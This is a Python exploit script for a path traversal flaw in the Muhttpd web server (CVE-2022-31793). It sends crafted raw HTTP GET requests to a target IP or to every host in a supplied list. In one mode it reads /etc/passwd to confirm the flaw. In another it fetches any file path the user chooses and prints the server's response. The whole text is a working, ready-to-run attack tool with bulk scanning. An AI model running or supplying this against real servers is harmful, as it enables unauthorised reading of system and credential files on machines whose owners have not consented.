
import argparse
import socket
import sys
from urllib import request

def do_banner():
    print("")
    print("   _______      ________    ___   ___ ___  ___       ____  __ ______ ___ ____  ")
    print("  / ____\ \    / /  ____|  |__ \ / _ \__ \|__ \     |___ \/_ |____  / _ \___ \ ")
    print(" | |     \ \  / /| |__ ______ ) | | | | ) |  ) |_____ __) || |   / / (_) |__) |")
    print(" | |      \ \/ / |  __|______/ /| | | |/ /  / /______|__ < | |  / / \__, |__ < ")
    print(" | |____   \  /  | |____    / /_| |_| / /_ / /_      ___) || | / /    / /___) |")
    print("  \_____|   \/   |______|  |____|\___/____|____|    |____/ |_|/_/    /_/|____/ ")
    print("                                                                  Auther:@Wadxm")                                                                                                                                               
    print("")

def exploit(ip,payload):
            s = socket.socket()
            s.connect((ip,80))
            request = f'GET a{payload} HTTP/1.1\r\nHost:{ip}\r\n\r\n'
            s.send(request.encode('ascii')) #ascii编码传输
            response = b''
            chunk = s.recv(409600) # 从socket接收数据
            while chunk:
                response += chunk
                chunk = s.recv(409600)
            s.close()
            res = response.decode('ascii') #ascii解码
            return res

if __name__ == "__main__":
    do_banner()
    parser = argparse.ArgumentParser(description='Muhttpd web server Path traversal (CVE-2022-31793)')
    parser.add_argument('-u',action="store",dest="ip",help="The ip to test")
    parser.add_argument('-l',action="store",dest="list",help="The url list")
    parser.add_argument('-v',action='store_true', default=False,dest="verify",help="verify")
    parser.add_argument('-f',action="store",dest="filepath",help="The file path")
    args = parser.parse_args()
    if args.ip and args.list:
        print("User specified both '-u' and '-l'. Only one may be chosen")
        sys.exit(1)
    if not args.ip and not args.list:
        print("User specified neither '-u' nor '-l'. User must choose one")
        sys.exit(1)
    if args.verify and args.filepath:
        print("User specified both '-v' and '-f'. Only one may be chosen")
        sys.exit(1)
    if not args.verify and not args.filepath:
        print("User specified neither '-v' nor '-f'. User must choose one")
        sys.exit(1)

    
    if args.verify:
        print("[+] Verifying the target")
        payload = '/etc/passwd'
        if args.ip:
            res = exploit(args.ip,payload)
            if ":/bin/" in res:
                print(args.ip+' is Vulnerable')
        if args.list:
            print('Loading url file...')
            with open(args.list, 'r') as file:
                f = file.readlines()
            for i in f:
                i = i.strip('\n')
                try:
                    res = exploit(i,payload)
                    if ":/bin/" in res:
                        print(i+' is Vulnerable')
                except:
                    print('[-] The HTTP request failed')
                    sys.exit(0)

    if args.filepath:
        print("[+] Generating a payload")
        payload = args.filepath
        if args.ip:
            res = exploit(args.ip,payload)
            print(res)
        if args.list:
            print('Loading url file...')
            with open(args.list, 'r') as file:
                f = file.readlines()
            for i in f:
                i = i.strip('\n')
                try:
                    res = exploit(i,payload)
                    print(res)
                except:
                    print('[-] The HTTP request failed')
                    sys.exit(0)
